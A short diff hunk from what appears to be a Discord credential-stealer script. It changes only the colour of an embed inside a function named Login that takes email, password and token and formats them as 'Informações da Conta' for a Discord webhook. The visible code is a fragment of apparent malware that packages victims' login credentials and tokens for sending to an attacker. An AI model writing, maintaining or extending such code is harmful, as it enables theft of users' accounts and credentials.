@@ -145,7 +145,7 @@ function Login(email, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 15158332,
+                    "color": 1752220,
                     "fields": [
                         {
                             "name": "**Informações da Conta**",
